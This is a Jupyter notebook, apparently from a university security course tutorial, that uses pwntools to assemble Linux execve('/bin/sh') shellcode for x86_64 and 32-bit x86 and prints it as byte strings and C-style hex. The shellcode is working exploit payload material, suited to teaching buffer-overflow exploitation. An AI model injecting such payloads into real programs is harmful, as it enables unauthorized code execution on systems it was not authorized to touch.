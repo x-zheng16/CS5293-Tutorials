{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# need to install pwntools\n",
    "# http://docs.pwntools.com/en/stable/\n",
    "\n",
    "import pwnlib.shellcraft as shellcraft\n",
    "from pwnlib.asm import asm, disasm\n",
    "from pwnlib.context import context\n",
    "from pwnlib.runner import run_shellcode, run_assembly\n",
    "from pwnlib.elf import ELF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "shellcode for python bytes:\n",
      " b'jhH\\xb8/bin///sPH\\x89\\xe7hri\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05'\n",
      "shellcode for C string:\n",
      " \\x6a\\x68\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x2f\\x73\\x50\\x48\\x89\\xe7\\x68\\x72\\x69\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x31\\xf6\\x56\\x6a\\x08\\x5e\\x48\\x01\\xe6\\x56\\x48\\x89\\xe6\\x31\\xd2\\x6a\\x3b\\x58\\x0f\\x05\n",
      "length of shellcode is  48\n"
     ]
    }
   ],
   "source": [
    "with context.local(arch=\"x86_64\", bits=64):\n",
    "    assembly_shellcode = shellcraft.linux.sh()\n",
    "    bytes_shellcode = asm(assembly_shellcode)\n",
    "    print(\"shellcode for python bytes:\\n\", bytes_shellcode)\n",
    "    hex_str_shellcode = \"\\\\x\" + bytes_shellcode.hex(\"_\").replace(\"_\", \"\\\\x\")\n",
    "    print(\"shellcode for C string:\\n\", hex_str_shellcode)\n",
    "    print(\"length of shellcode is \", len(bytes_shellcode))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "shellcode for python bytes:\n",
      " b'1\\xc0Ph//shh/bin\\x89\\xe31\\xc91\\xd2\\xb0\\x0b\\xcd\\x80'\n",
      "shellcode for C string:\n",
      " \\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\n",
      "length of shellcode is  23\n"
     ]
    }
   ],
   "source": [
    "with context.local(arch=\"x86\", bits=32):\n",
    "    # assembly_shellcode = shellcraft.linux.sh()\n",
    "    assembly_shellcode = \"\"\"        \n",
    "        xor eax,eax\n",
    "        push eax\n",
    "        push 0x68732f2f\n",
    "        push 0x6e69622f\n",
    "        mov ebx,esp\n",
    "        xor ecx,ecx\n",
    "        xor edx,edx\n",
    "        mov al,0xb\n",
    "        int 0x80\n",
    "    \"\"\"\n",
    "    bytes_shellcode = asm(assembly_shellcode)\n",
    "    print(\"shellcode for python bytes:\\n\", bytes_shellcode)\n",
    "    hex_str_shellcode = \"\\\\x\" + bytes_shellcode.hex(\"_\").replace(\"_\", \"\\\\x\")\n",
    "    print(\"shellcode for C string:\\n\", hex_str_shellcode)\n",
    "    print(\"length of shellcode is \", len(bytes_shellcode))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "interpreter": {
   "hash": "31f2aee4e71d21fbe5cf8b01ff0e069b9275f58929596ceb00d14d90e3e16cd6"
  },
  "kernelspec": {
   "display_name": "Python 3.8.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
